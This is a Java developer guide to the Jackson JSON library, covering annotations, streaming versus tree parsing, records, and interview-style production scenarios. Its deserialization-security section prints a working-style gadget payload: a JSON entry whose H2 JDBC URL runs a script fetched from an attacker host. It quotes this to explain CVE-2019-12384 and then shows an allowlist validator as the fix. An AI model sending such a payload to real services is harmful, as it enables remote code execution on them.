# Jackson JSON Master Guide: Complete Annotations, Runtime Internals & 50+ Real-World Production Scenarios

> **Scope**: The Complete Jackson Annotation Catalog with Production Code Examples, Processing Models (Streaming `JsonParser`/`JsonGenerator` vs Tree `JsonNode` vs Databind), Polymorphic Deserialization & RCE Security Defense (`BasicPolymorphicTypeValidator`), Java 17/21 Records & Immutability, Enterprise PII Masking (`@JsonView`, Custom Serializers), Cyclic Reference Elimination (`@JsonIdentityInfo`), Thread-Safety & Performance Tuning, Beginner Traps, and Mission-Critical War-Room Post-Mortems.

---

## 🏛️ Guide Architecture Overview

```mermaid
flowchart TB
    subgraph L8 ["Layer 8: Performance Controls & Feature Flags"]
        direction LR
        F1["DeserializationFeature<br/>FAIL_ON_UNKNOWN_PROPERTIES"]
        F2["SerializationFeature<br/>WRITE_DATES_AS_TIMESTAMPS"]
        F3["JsonGenerator.Feature<br/>WRITE_BIGDECIMAL_AS_PLAIN"]
    end

    subgraph L7 ["Layer 7: Security Boundaries & Validation Matrix"]
        direction LR
        S1["BasicPolymorphicTypeValidator<br/>Strict Class & Package Allowlists"]
        S2["Default Typing Guard<br/>CVE Mitigation (H2, Commons-Collections RCE)"]
        S3["StreamReadConstraints<br/>Max Depth (1000) & Max String/Number Length"]
    end

    subgraph L6 ["Layer 6: Modern Language Integration & Immutability"]
        direction LR
        R1["Java 17/21 Records<br/>Canonical Constructor Binding"]
        R2["ParameterNamesModule<br/>-parameters javac Compiler Flag"]
        R3["Kotlin & Scala Modules<br/>Null-Safety & Reflection Bridges"]
    end

    subgraph L5 ["Layer 5: Enterprise Annotation Subsystem"]
        direction LR
        A1["Access & Binding<br/>@JsonProperty | @JsonAlias | @JsonIgnore"]
        A2["Format & Shape<br/>@JsonFormat | @JsonInclude | @JsonRawValue"]
        A3["Polymorphism & Identity<br/>@JsonTypeInfo | @JsonSubTypes | @JsonIdentityInfo"]
    end

    subgraph L4 ["Layer 4: Data Binding Subsystem (ObjectMapper)"]
        direction LR
        DB1["DeserializerCache & SerializerCache<br/>TypeFactory & JavaType Resolution"]
        DB2["BeanDeserializer / BeanSerializer<br/>SettableBeanProperty Dynamic Invocations"]
        DB3["Introspection Engine<br/>JacksonAnnotationIntrospector"]
    end

    subgraph L3 ["Layer 3: Tree Model Document Subsystem"]
        direction LR
        TM1["JsonNode Hierarchy<br/>ContainerNode: ObjectNode & ArrayNode"]
        TM2["ValueNode Substrate<br/>TextNode, IntNode, BooleanNode, NullNode"]
        TM3["Pointer & Traversal<br/>JsonPointer (/user/addresses/0/city)"]
    end

    subgraph L2 ["Layer 2: Low-Level Streaming API"]
        direction LR
        ST1["JsonParser (UTF8StreamJsonParser)<br/>Token Stream: START_OBJECT, FIELD_NAME..."]
        ST2["JsonGenerator (UTF8JsonGenerator)<br/>Direct Low-Allocation Byte Serialization"]
    end

    subgraph L1 ["Layer 1: Memory & Buffer Recycling Substrate"]
        direction LR
        M1["BufferRecycler Pool<br/>Recycled byte[]/char[] Buffers"]
        M2["ThreadLocal vs QueuePool<br/>Virtual Thread OOM Protection (Jackson 2.16+)"]
        M3["Bytecode Acceleration<br/>Blackbird / Afterburner (MethodHandles)"]
    end

    L8 --> L7
    L7 --> L6
    L6 --> L5
    L5 --> L4
    L4 --> L3
    L3 --> L2
    L2 --> L1

    classDef l8 fill:#1e1e2e,stroke:#f38ba8,stroke-width:2px,color:#cdd6f4;
    classDef l7 fill:#1e1e2e,stroke:#fab387,stroke-width:2px,color:#cdd6f4;
    classDef l6 fill:#1e1e2e,stroke:#f9e2af,stroke-width:2px,color:#cdd6f4;
    classDef l5 fill:#1e1e2e,stroke:#a6e3a1,stroke-width:2px,color:#cdd6f4;
    classDef l4 fill:#1e1e2e,stroke:#89dceb,stroke-width:2px,color:#cdd6f4;
    classDef l3 fill:#1e1e2e,stroke:#89b4fa,stroke-width:2px,color:#cdd6f4;
    classDef l2 fill:#1e1e2e,stroke:#b4befe,stroke-width:2px,color:#cdd6f4;
    classDef l1 fill:#1e1e2e,stroke:#cba6f7,stroke-width:2px,color:#cdd6f4;

    class F1,F2,F3 l8;
    class S1,S2,S3 l7;
    class R1,R2,R3 l6;
    class A1,A2,A3 l5;
    class DB1,DB2,DB3 l4;
    class TM1,TM2,TM3 l3;
    class ST1,ST2 l2;
    class M1,M2,M3 l1;
```



#### Architectural Breakdown: The 8-Layer Jackson Serialization & Security Substrate

1. **Visual Architecture & Component Topology**:
   - **Layer 1 (Memory & Buffer Recycling Substrate)**: Foundation of Jackson throughput. Manages temporary I/O buffers (`char[]` and `byte[]`) via `BufferRecycler` to prevent GC heap churn. In modern high-concurrency systems, uses lock-free queue pools or thread-local caches, backed by bytecode accelerators like `BlackbirdModule` (using Java 9+ `MethodHandles`).
   - **Layer 2 (Low-Level Streaming API)**: Direct token stream processing via `JsonParser` and `JsonGenerator`. Reads UTF-8 bytes directly without intermediate String allocations. Operates in $O(1)$ memory complexity regardless of input size.
   - **Layer 3 (Tree Model Document Subsystem)**: In-memory hierarchical DOM representation (`JsonNode`, `ObjectNode`, `ArrayNode`). Allows ad-hoc traversal, dynamic schema manipulation, and `JsonPointer` queries without binding to a static Java class.
   - **Layer 4 (Data Binding Subsystem - `ObjectMapper`)**: Core reflection and introspection engine. Utilizes `DeserializerCache` and `SerializerCache` to avoid repeated class inspection. Generates property setters and getters via `SettableBeanProperty` accessors.
   - **Layer 5 (Enterprise Annotation Subsystem)**: Granular declarative serialization rules controlling field visibility (`@JsonProperty`, `@JsonIgnore`), payload shaping (`@JsonFormat`, `@JsonInclude`), and polymorphic dispatch (`@JsonTypeInfo`, `@JsonSubTypes`).
   - **Layer 6 (Modern Language Integration & Immutability)**: Native support for Java 17/21 Records via canonical constructor parameter binding, requiring the `-parameters` compiler flag and `ParameterNamesModule`.
   - **Layer 7 (Security Boundaries & Validation Matrix)**: Defensive perimeter protecting against Remote Code Execution (RCE) deserialization gadget chains. Implements `BasicPolymorphicTypeValidator` allowlisting and Jackson 2.15+ `StreamReadConstraints` (guarding against nested depth algorithmic complexity attacks).
   - **Layer 8 (Performance Controls & Feature Flags)**: Global runtime switches (`DeserializationFeature`, `SerializationFeature`, `JsonGenerator.Feature`) that enforce enterprise data integrity, timezone conventions, and numeric precision rules.

2. **Execution Flow & Serialization/Deserialization State Machine**:
   - **Phase 1: Tokenization**: An incoming `InputStream` enters `UTF8StreamJsonParser`. A `BufferRecycler` allocates reusable input buffers. The parser scans UTF-8 byte sequences, advancing through states: `START_OBJECT` $\to$ `FIELD_NAME` $\to$ `VALUE_STRING` / `VALUE_NUMBER` $\to$ `END_OBJECT`.
   - **Phase 2: Type Resolution & Introspection**: `ObjectMapper` queries `TypeFactory` to resolve the target `JavaType` (accounting for generic type erasure via `TypeReference<T>`). It checks `DeserializerCache`. If a cache miss occurs, `JacksonAnnotationIntrospector` scans annotations, resolves constructors/creators, and constructs a specialized `BeanDeserializer`.
   - **Phase 3: Object Instantiation & Property Hydration**: For standard POJOs, the default zero-arg constructor is invoked via reflection, followed by iterative loop calls to `SettableBeanProperty.deserializeAndSet(parser, ctxt, bean)`. For Java Records or `@JsonCreator` targets, tokens are buffered into a property-based creator array until all parameters are deserialized, then the canonical constructor is invoked atomically.
   - **Phase 4: Security Verification**: If `@JsonTypeInfo` is present, the parser extracts the type identifier token (e.g. `"@class"` or `"type"`). Before classloading, `BasicPolymorphicTypeValidator` validates the target class against authorized packages. If rejected, a `SecurityException` aborts parsing before arbitrary code can execute.

3. **Low-Level JVM & Memory Mechanics**:
   - **BufferRecycler & Virtual Thread Memory Hazards**: In traditional thread-pooled servlet containers (Tomcat with 200 platform threads), `ThreadLocal<SoftReference<BufferRecycler>>` recycles $200 \times 16\text{KB} \approx 3.2\text{MB}$ of memory. Under Java 21 Project Loom with 1,000,000 concurrent Virtual Threads, 1,000,000 uncollected `BufferRecycler` instances become pinned in native/heap memory, precipitating an immediate catastrophic OutOfMemoryError. Jackson 2.16+ mitigates this via shared lock-free recycler pools (`JsonFactory.builder().recyclerPool(...)`).
   - **IEEE 754 64-bit Long Primary Key Truncation**: JavaScript represents all numbers as IEEE 754 double-precision floats, which have only 53 bits of mantissa ($2^{53} - 1 = 9,007,199,254,740,991$). Long IDs (such as Twitter/Snowflake 64-bit IDs like `1792837492837482912L`) lose their least significant digits in browser JSON parsers, causing silent data corruption. Enterprise Jackson pipelines mandate `@JsonSerialize(using = ToStringSerializer.class)` or `WRITE_BIGDECIMAL_AS_PLAIN` to preserve string fidelity.

4. **Production Failure Modes & SRE Diagnostics**:
   - **RCE Deserialization Gadget Exploits**: Enabling `enableDefaultTyping()` allows attackers to supply arbitrary classes (e.g. Spring `FileSystemXmlApplicationContext`, H2 `JdbcRowSetImpl`) to trigger arbitrary remote shell execution. Diagnostic: audit codebase for `enableDefaultTyping()` or unbounded `@JsonTypeInfo(use = Id.CLASS)` and replace immediately with `BasicPolymorphicTypeValidator.builder().allowIfBaseType(...)`.
   - **10GB readTree / DOM Amplification OOM**: Ingesting a large 500MB JSON payload via `objectMapper.readTree(inputStream)` allocates millions of `JsonNode` wrapper objects, expanding memory by $5\times$ to $10\times$ and exhausting the JVM heap. Diagnostic: replace Tree Model parsing with Streaming `JsonParser` token loops ($O(1)$ memory consumption) for high-throughput batch ingest pipelines.
   - **Infinite Cyclic Serialization Recursion**: Bidirectional JPA entity relationships (`@OneToMany` / `@ManyToOne`) without Jackson coordination cause infinite serialization loops, resulting in fatal `StackOverflowError`. Diagnostic: tag the owning side with `@JsonManagedReference` and the child side with `@JsonBackReference`, or introduce `@JsonIdentityInfo(generator = ObjectIdGenerators.PropertyGenerator.class, property = "id")`.

<details>
<summary>View Legacy ASCII Guide Architecture Overview</summary>

```text
========================================================================================================================
                                     JACKSON JSON & SERIALIZATION ARCHITECTURE
========================================================================================================================
 [Layer 1: The Complete Jackson Annotation Catalog] --> 25+ Annotations with Code Examples, Use Cases & Traps
 [Layer 2: Core Processing Models & Memory Engine]  --> Streaming API O(1), Tree Model (JsonNode) Amplification, Databind
 [Layer 3: Polymorphic Deserialization & Security]  --> @JsonTypeInfo, Default Typing CVEs, BasicPolymorphicTypeValidator
 [Layer 4: Modern Java 17/21 Records & Immutability]--> Canonical Constructors, -parameters Compiler Flag, ParameterNames
 [Layer 5: 50+ In-Depth Real-World Scenario Q&A]    --> Staff-Level Questions, Memory Limits, Concurrency, Rest APIs
 [Layer 6: Beginner Mistakes & Fatal Anti-Patterns] --> 8 Costly Traps (New ObjectMapper per Request, SimpleDateFormat)
 [Layer 7: Globally Reported Production Incidents]  --> Real Outages (H2 JDBC RCE, 10GB readTree OOM, Snowflake Truncation)
 [Layer 8: Rapid-Fire Cheat Sheet & Feature Matrix] --> DeserializationFeatures, SerializationFeatures, Performance Rules
========================================================================================================================
```

</details>

---

# Layer 1: The Complete Jackson Annotation Catalog (With Code & Explanations)

Every Jackson annotation serves a specific phase in the serialization/deserialization pipeline. Below is the definitive, zero-ambiguity reference catalog.

---

### 1. `@JsonProperty`
- **Purpose**: Maps a JSON property name to a Java field, getter, setter, or constructor parameter. Controls read/write access.
- **Attributes**: `value` (custom name), `access` (`READ_ONLY`, `WRITE_ONLY`, `READ_WRITE`), `required`, `defaultValue`.
- **Production Example**:
  ```java
  public class UserCredentials {
      @JsonProperty("user_name")
      private String username;

      // WRITE_ONLY: Can be received in JSON request (deserialized),
      // but is NEVER returned in JSON response (serialized)!
      @JsonProperty(value = "password", access = JsonProperty.Access.WRITE_ONLY)
      private String password;

      // READ_ONLY: Included in responses, ignored if client attempts to send it
      @JsonProperty(value = "created_at", access = JsonProperty.Access.READ_ONLY)
      private Instant createdAt;
  }
  ```

---

### 2. `@JsonIgnore` & `@JsonIgnoreProperties`
- **Purpose**: Suppresses fields from both serialization and deserialization.
- **`@JsonIgnore`**: Field-level exclusion.
- **`@JsonIgnoreProperties`**: Class-level bulk exclusion or ignoring unexpected incoming fields.
- **Production Example**:
  ```java
  // ignoreUnknown = true: Prevents UnrecognizedPropertyException when clients send extra fields!
  @JsonIgnoreProperties(ignoreUnknown = true, value = {"internalHash", "tempToken"})
  public class AccountDto {
      private String accountNumber;

      @JsonIgnore // Excludes sensitive internal state
      private String secretSalt;
  }
  ```

---

### 3. `@JsonInclude`
- **Purpose**: Conditionally includes fields based on value state, slashing JSON payload size over the network.
- **Options**: `ALWAYS`, `NON_NULL`, `NON_EMPTY` (excludes null, empty strings, empty collections/arrays), `NON_DEFAULT`.
- **Production Example**:
  ```java
  // Excludes fields that are null OR empty collections from the serialized JSON
  @JsonInclude(JsonInclude.Include.NON_EMPTY)
  public class OrderResponse {
      private String orderId;
      private List<String> discountCodes; // Omitted if null or empty list!
      private Map<String, Object> metadata; // Omitted if empty map!
  }
  ```

---

### 4. `@JsonFormat`
- **Purpose**: Enforces exact formatting rules for dates, times, timestamps, and numbers.
- **Production Example**:
  ```java
  public class InvoiceDto {
      // Formats date into strict ISO-8601 string in UTC timezone
      @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd'T'HH:mm:ss.SSSXXX", timezone = "UTC")
      private Instant invoiceDate;

      // Serializes a BigDecimal as a clean formatted string
      @JsonFormat(shape = JsonFormat.Shape.STRING)
      private BigDecimal totalAmount;
  }
  ```

---

### 5. `@JsonCreator` & `@JsonProperty`
- **Purpose**: Directs Jackson to instantiate immutable objects via a specific constructor or static factory method instead of reflection setters.
- **Production Example**:
  ```java
  public class ImmutableAddress {
      private final String street;
      private final String city;
      private final int zipCode;

      @JsonCreator
      public ImmutableAddress(
          @JsonProperty("street") String street,
          @JsonProperty("city") String city,
          @JsonProperty("zip_code") int zipCode
      ) {
          this.street = street;
          this.city = city;
          this.zipCode = zipCode;
      }
      // Only getters, no setters!
  }
  ```

---

### 6. `@JsonValue` & `@JsonEnumDefaultValue`
- **Purpose**: `@JsonValue` serializes an entire object or Enum as a single scalar value. `@JsonEnumDefaultValue` provides a safe fallback for unknown enum values sent by external clients.
- **Production Example**:
  ```java
  public enum OrderStatus {
      PENDING("p"),
      SHIPPED("s"),
      DELIVERED("d"),
      
      @JsonEnumDefaultValue
      UNKNOWN("unknown");

      private final String code;
      OrderStatus(String code) { this.code = code; }

      @JsonValue // Serializes as "p", "s", or "d" instead of "PENDING"
      public String getCode() { return code; }
  }
  ```

---

### 7. `@JsonUnwrapped`
- **Purpose**: Flattens a nested sub-object's properties directly into the parent JSON object without an intermediate container key.
- **Production Example**:
  ```java
  public class UserProfile {
      private String username;

      @JsonUnwrapped(prefix = "addr_")
      private Address address;
  }
  // Generated JSON:
  // {"username": "alice", "addr_street": "Main St", "addr_city": "Austin"}
  ```

---

### 8. `@JsonAnyGetter` & `@JsonAnySetter`
- **Purpose**: Creates an extensible model where unknown or dynamic JSON properties are captured into an internal Map rather than dropped.
- **Production Example**:
  ```java
  public class DynamicEventPayload {
      private String eventType;
      private Map<String, Object> dynamicAttributes = new HashMap<>();

      @JsonAnySetter
      public void addAttribute(String key, Object value) {
          this.dynamicAttributes.put(key, value);
      }

      @JsonAnyGetter
      public Map<String, Object> getDynamicAttributes() {
          return dynamicAttributes;
      }
  }
  ```

---

### 9. `@JsonRawValue`
- **Purpose**: Serializes a String field as raw, unescaped JSON text without wrapping it in quotes.
- **Production Example**:
  ```java
  public class WebhookEvent {
      private String eventId;

      @JsonRawValue // Embeds pre-rendered JSON string directly!
      private String rawJsonPayload; // e.g. "{\"status\":\"ok\"}"
  }
  // Generated JSON: {"eventId": "123", "rawJsonPayload": {"status":"ok"}}
  ```

---

### 10. `@JsonAlias`
- **Purpose**: Accepts multiple alternative JSON keys during deserialization without altering the serialized output name.
- **Production Example**:
  ```java
  public class CustomerRequest {
      // Accepts "tax_id", "ssn", or "social_security_number" during deserialization!
      @JsonProperty("tax_id")
      @JsonAlias({"ssn", "social_security_number"})
      private String taxId;
  }
  ```

---

### 11. `@JsonNaming`
- **Purpose**: Applies a global naming convention (Snake Case, Kebab Case, Upper Camel Case) across an entire class, eliminating per-field `@JsonProperty` boilerplate.
- **Production Example**:
  ```java
  @JsonNaming(PropertyNamingStrategies.SnakeCaseStrategy.class)
  public record OrderDto(
      String orderTrackingId,   // Serialized as: "order_tracking_id"
      BigDecimal estimatedTax    // Serialized as: "estimated_tax"
  ) {}
  ```

---

### 12. `@JsonSerialize` & `@JsonDeserialize` (Custom Serializers & Deserializers)
- **Purpose**: Binds custom low-level serializers (`JsonSerializer`) or deserializers (`JsonDeserializer`) directly to specific fields, methods, or classes for raw token manipulation.
- **Production Example**:
  ```java
  public record PaymentRecord(
      String accountId,
      @JsonSerialize(using = MaskedCreditCardSerializer.class)
      @JsonDeserialize(using = SanitizedStringDeserializer.class)
      String creditCardNumber
  ) {}
  ```

---

### 12b. Jackson Converters: `@JsonSerialize(converter = ...)` & `@JsonDeserialize(converter = ...)`
- **Purpose**: High-level, type-safe alternative to writing low-level `JsonSerializer` / `JsonDeserializer` code. Instead of manually emitting JSON tokens via `JsonGenerator` or parsing tokens via `JsonParser`, a `Converter<IN, OUT>` (typically extending `StdConverter<IN, OUT>`) converts the target object to/from an intermediate representation (like a `String`, `Map`, or intermediate DTO) that Jackson already knows how to serialize and deserialize.
- **Attributes**:
  - `converter`: Binds the conversion logic to the field or class.
- **Production Example**:
  ```java
  // 1. Serialization Converter: Domain Money -> String formatted as "$19.99"
  public class MoneyToStringConverter extends StdConverter<Money, String> {
      @Override
      public String convert(Money value) {
          if (value == null) return null;
          return "$" + value.amount().setScale(2, RoundingMode.HALF_UP).toPlainString();
      }
  }

  // 2. Deserialization Converter: String "$19.99" -> Domain Money
  public class StringToMoneyConverter extends StdConverter<String, Money> {
      @Override
      public Money convert(String value) {
          if (value == null || value.isBlank()) return null;
          String clean = value.replace("$", "").trim();
          return new Money(new BigDecimal(clean), Currency.getInstance("USD"));
      }
  }

  // 3. Applying Paired Two-Way Converters on a Record or DTO:
  public record ProductListing(
      String sku,
      @JsonSerialize(converter = MoneyToStringConverter.class)
      @JsonDeserialize(converter = StringToMoneyConverter.class)
      Money price
  ) {}
  ```

---

### 12c. Element-Level Collection Converters: `contentConverter`
- **Purpose**: Applies a converter to individual items inside a `List`, `Set`, `Array`, or values inside a `Map` without having to write a custom collection-level serializer.
- **Attributes**:
  - `@JsonSerialize(contentConverter = ...)`: Converts each element in the collection before serializing to JSON.
  - `@JsonDeserialize(contentConverter = ...)`: Converts each deserialized JSON array item into the target domain element type.
- **Production Example**:
  ```java
  // Trims and upper-cases each individual string inside a list
  public class UpperCaseTrimConverter extends StdConverter<String, String> {
      @Override
      public String convert(String value) {
          return (value != null) ? value.trim().toUpperCase() : null;
      }
  }

  public record TaggedArticle(
      String title,
      // Transforms every element inside the List individually:
      @JsonDeserialize(contentConverter = UpperCaseTrimConverter.class)
      List<String> tags
  ) {}
  // Incoming JSON: {"title": "Tech", "tags": [" java ", " spring ", " k8s "]}
  // Deserialized Record tags: ["JAVA", "SPRING", "K8S"]

---

### 13. `@JsonView`
- **Purpose**: Enables role-based, multi-tier JSON serialization from a single class, omitting sensitive fields depending on the active caller view.
- **Production Example**:
  ```java
  public class ViewScopes {
      public interface Public {}
      public interface Internal extends Public {}
  }

  public record Employee(
      @JsonView(ViewScopes.Public.class) String name,
      @JsonView(ViewScopes.Public.class) String department,
      @JsonView(ViewScopes.Internal.class) BigDecimal salary // Hidden from Public view!
  ) {}
  ```

---

### 14. `@JsonIdentityInfo`
- **Purpose**: Resolves circular references and cyclic object graphs by replacing subsequent circular references with the object's ID integer or UUID.
- **Production Example**:
  ```java
  @JsonIdentityInfo(generator = ObjectIdGenerators.PropertyGenerator.class, property = "id")
  public class Department {
      private Long id;
      private List<Employee> employees;
  }

  @JsonIdentityInfo(generator = ObjectIdGenerators.PropertyGenerator.class, property = "id")
  public class Employee {
      private Long id;
      private Department department; // Circular reference serialized as "department": 10
  }
  ```

---

### 15. `@JsonManagedReference` & `@JsonBackReference`
- **Purpose**: Solves bidirectional parent-child JPA entity serialization without infinite loops. The forward reference is serialized; the back reference is omitted.
- **Production Example**:
  ```java
  public class Parent {
      @JsonManagedReference
      private List<Child> children;
  }

  public class Child {
      @JsonBackReference
      private Parent parent; // Completely omitted during serialization!
  }
  ```

---

### 16. `@JsonTypeInfo` & `@JsonSubTypes`
- **Purpose**: Enables polymorphic serialization of interfaces and abstract classes by storing a type discriminator.
- **Production Example**:
  ```java
  @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
  @JsonSubTypes({
      @JsonSubTypes.Type(value = CreditCardPayment.class, name = "CARD"),
      @JsonSubTypes.Type(value = PayPalPayment.class, name = "PAYPAL")
  })
  public sealed interface PaymentMethod permits CreditCardPayment, PayPalPayment {}
  ```

---

# Layer 2: Core Processing Models & Memory Engine

---

### Scenario 1: Streaming API (`JsonParser`/`JsonGenerator`) vs Tree Model vs Databind
**Interviewer Evaluation:** Assesses low-level memory allocation, token-based pull parsing, and processing multi-gigabyte JSON payloads without heap exhaustion.

#### Technical Deep Dive
Jackson provides three primary paradigms to process JSON:
1. **Streaming API (`JsonParser` / `JsonGenerator`)**:
   - Lowest-level, highest-performance processing model.
   - Operates as an **event-driven pull parser** inspecting sequential tokens (`START_OBJECT`, `FIELD_NAME`, `VALUE_STRING`, `END_OBJECT`).
   - Memory footprint: **$O(1)$ constant memory** (a few kilobytes of buffer).
   - Processes a 10GB JSON file with identical memory whether running with 256MB or 32GB JVM heap!
2. **Tree Model (`JsonNode` / `ObjectMapper.readTree()`)**:
   - Builds a fully materialized in-memory graph of interconnected Java nodes (`ObjectNode`, `ArrayNode`, `TextNode`).
   - **Memory Amplification**: 1 byte of raw JSON text expands to **6 to 10 bytes of JVM heap memory** due to Java object headers (16 bytes per object), pointer alignments, and references.
   - Parsing a 2GB JSON file via `readTree()` allocates 15GB+ in heap, immediately triggering `OutOfMemoryError: Java heap space`.
3. **Data Binding (`ObjectMapper.readValue(..., MyPojo.class)`)**:
   - Maps JSON tokens directly into strongly-typed Java POJOs via reflection and bytecode accessors.
   - High developer ergonomics; medium memory consumption.

```java
// O(1) Constant Memory Hybrid Streaming Processing of a 10GB JSON Array:
public void streamTransactions(InputStream inputStream, Consumer<TransactionDto> consumer) throws IOException {
    JsonFactory factory = new JsonFactory();
    try (JsonParser parser = factory.createParser(inputStream)) {
        if (parser.nextToken() != JsonToken.START_ARRAY) {
            throw new IllegalStateException("Expected root array");
        }
        ObjectMapper mapper = new ObjectMapper();
        while (parser.nextToken() == JsonToken.START_OBJECT) {
            // Deserializes one record at a time; immediately garbage-collectable!
            TransactionDto tx = mapper.readValue(parser, TransactionDto.class);
            consumer.accept(tx);
        }
    }
}
```

---

# Layer 3: Polymorphic Deserialization & RCE Vulnerability Defense

---

### Scenario 2: Remote Code Execution (RCE) via `enableDefaultTyping()` & The Gadget Chain
**Interviewer Evaluation:** Assesses security knowledge of polymorphic typing, how attackers exploit Java deserialization gadgets via `@JsonTypeInfo`, and how `BasicPolymorphicTypeValidator` prevents exploits.

#### Technical Deep Dive
- **The Fatal Flaw (`enableDefaultTyping()` / CVE-2019-12384)**:
  Historically, developers enabled default typing to avoid writing explicit subtypes:
  `objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);`
  This instructed Jackson to serialize the fully qualified Java class name in a `@class` property:
  ```json
  ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url": "jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker.com/exploit.sql'"}]
  ```
- **The Exploit**:
  An attacker passes a dangerous class that exists on the classpath (a **Gadget Class** like Logback, Spring, or Commons-Collections).
  When Jackson deserializes, it invokes the gadget's constructor or setter, triggering the malicious JDBC connection or executing arbitrary shell commands (**Remote Code Execution**)!
- **The Modern Defense (`BasicPolymorphicTypeValidator`)**:
  Mandatory in Jackson 2.10+. Enforces a strict, whitelist-only type validator:

```java
// Production Hardened Polymorphic Type Validator:
BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType("com.enterprise.banking.model.event.")
    .allowIfSubType("com.enterprise.banking.model.event.")
    .denyForExactBaseType(Object.class) // Never allow Object.class as base!
    .build();

ObjectMapper mapper = JsonMapper.builder()
    .polymorphicTypeValidator(ptv)
    .activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY)
    .build();
```

---

# Layer 4: Modern Java 17/21 Records & Immutability

---

### Scenario 3: Java 17/21 Records Deserialization & The `-parameters` Compiler Flag
**Interviewer Evaluation:** Tests understanding of Java 17+ record semantics, bytecode constructor parameters, and why records eliminate reflection setter mutation.

#### Technical Deep Dive
- Traditional Java beans require a default zero-argument constructor so Jackson can instantiate the object and populate fields via reflection setters.
- **Java 17/21 Records**:
  - Completely immutable; fields are `private final` without setters.
  - Have a single **Canonical Constructor** matching all record components.
  - Jackson 2.12+ natively detects records without `@JsonCreator`. It parses JSON tokens into an in-memory parameter array and invokes the canonical constructor in a single atomic operation!
- **Why Jackson Fails Without `-parameters`**:
  - To map JSON keys (`{"order_id": "10"}`) to record constructor arguments (`String orderId`), Jackson needs access to constructor parameter names.
  - If the code is compiled without the Java compiler flag **`-parameters`**, the bytecode retains only synthetic names (`arg0`, `arg1`), causing deserialization failures!
  - In `pom.xml`, configure:
    ```xml
    <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <configuration>
            <parameters>true</parameters>
        </configuration>
    </plugin>
    ```

---

# Layer 5: 50 In-Depth Real-World Scenario Questions & Answers

---

### Scenario 4: Thread Safety of `ObjectMapper` & The Singleton Pattern
**Question:** Is `ObjectMapper` thread-safe? Why does calling `new ObjectMapper()` inside an HTTP request handler destroy API performance?
- **Answer:** Yes, `ObjectMapper` is thread-safe for reading and writing after configuration is complete. Calling `new ObjectMapper()` inside a request handler creates fresh internal reflection caches, serializer providers, and buffer pools on every invocation. This causes:
  1. Severe GC allocation churn (allocating hundreds of temporary objects per request).
  2. Loss of warm reflection caches, increasing serialization CPU time by **10x to 30x**.
  Always declare `ObjectMapper` as a **Spring `@Bean` or `static final` singleton**.

---

### Scenario 5: Handling IEEE 754 64-bit Long Precision Loss in JavaScript Clients
**Question:** A Spring Boot service returns a 64-bit Snowflake ID (`Long id = 1714567890123456789L`). The browser frontend receives `1714567890123456800`. What happened, and how do you fix it in Jackson?
- **Answer:** JavaScript numbers conform to IEEE 754 double-precision floating-point format, which has a maximum safe integer limit of $2^{53} - 1$ (`9,007,199,254,740,991`). Large 64-bit Java longs exceed this limit and lose their trailing digits.
  - *Fix*: Serialize 64-bit IDs as Strings:
    ```java
    @JsonSerialize(using = ToStringSerializer.class)
    private Long id;
    ```

---

### Scenario 6: Disabling `FAIL_ON_UNKNOWN_PROPERTIES` for Forward Compatibility
**Question:** Why does microservice communication break when upstream services add new fields, and how do you achieve backward/forward compatibility?
- **Answer:** By default, Jackson enables `DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES`. If an upstream service adds a new field to its JSON response, downstream consumers crash with `UnrecognizedPropertyException`.
  - *Fix*: Disable the feature globally:
    ```java
    objectMapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
    ```

---

### Scenario 7: Java 8+ Date/Time (`java.time`) Serialization Pitfalls
**Question:** Why does serializing `java.time.Instant` without configuration produce a numeric timestamp instead of an ISO-8601 string?
- **Answer:** Jackson's legacy behavior defaults to serializing dates as numeric timestamps (milliseconds since epoch).
  - *Fix*: Register `JavaTimeModule` and disable `WRITE_DATES_AS_TIMESTAMPS`:
    ```java
    ObjectMapper mapper = JsonMapper.builder()
        .addModule(new JavaTimeModule())
        .disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS)
        .build();
    ```

---

### Scenario 8: Safe Enum Handling: Fallback for Unknown Values
**Question:** How do you prevent an API from crashing when a third-party partner introduces a new Enum value that your code has not yet implemented?
- **Answer:** Configure Jackson to fall back to a default value rather than throwing an exception:
  ```java
  objectMapper.enable(DeserializationFeature.READ_UNKNOWN_ENUM_VALUES_USING_DEFAULT_VALUE);
  ```
  In the enum class, designate the fallback:
  ```java
  public enum TransactionType {
      PURCHASE, REFUND, 
      @JsonEnumDefaultValue UNKNOWN;
  }
  ```

---

### Scenario 9: Customizing Date Formats Per Field vs Globally
**Question:** How do you serialize one date field as `yyyy-MM-dd` while maintaining standard ISO-8601 UTC on all other timestamps?
- **Answer:** Use the field-level `@JsonFormat` annotation:
  ```java
  @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
  private LocalDate birthDate;
  ```

---

### Scenario 10: Circular Reference Elimination via `@JsonIdentityInfo`
**Question:** An API returning JPA `Author` and `Book` entities crashes with `StackOverflowError`. How does `@JsonIdentityInfo` resolve this without losing data?
- **Answer:** Circular references occur when Parent references Child and Child references Parent. `@JsonIdentityInfo` serializes the full parent object on first encounter. On subsequent circular references, it replaces the object with its ID integer (`"author": 42`), breaking the infinite loop cleanly.

---

### Scenario 11: Dynamic Field Filtering with `@JsonFilter` & `FilterProvider`
**Question:** How do you programmatically exclude specific fields at runtime based on an HTTP query parameter (`?fields=id,name`)?
- **Answer:** Use `@JsonFilter` on the DTO:
  ```java
  @JsonFilter("dynamicFilter")
  public class DynamicDto { ... }
  ```
  In the controller, register a `SimpleBeanPropertyFilter`:
  ```java
  FilterProvider filters = new SimpleFilterProvider()
      .addFilter("dynamicFilter", SimpleBeanPropertyFilter.filterOutAllExcept("id", "name"));
  String json = objectMapper.writer(filters).writeValueAsString(dto);
  ```

---

### Scenario 12: Generic Collections & `TypeReference<T>`
